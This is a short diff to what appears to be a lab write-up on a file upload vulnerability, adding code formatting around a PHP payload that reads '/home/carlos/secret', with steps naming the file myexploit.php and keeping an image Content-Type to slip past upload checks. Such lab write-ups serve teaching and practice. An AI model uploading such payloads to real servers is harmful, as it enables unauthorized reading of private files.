@@ -23,9 +23,9 @@ to
 myexploit.php
 
 4. I replaced the image contents with the following PHP payload:
-
+```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
-
+```
 5. I intentionally kept the Content-Type header unchanged:
 
 Content-Type: image/webp
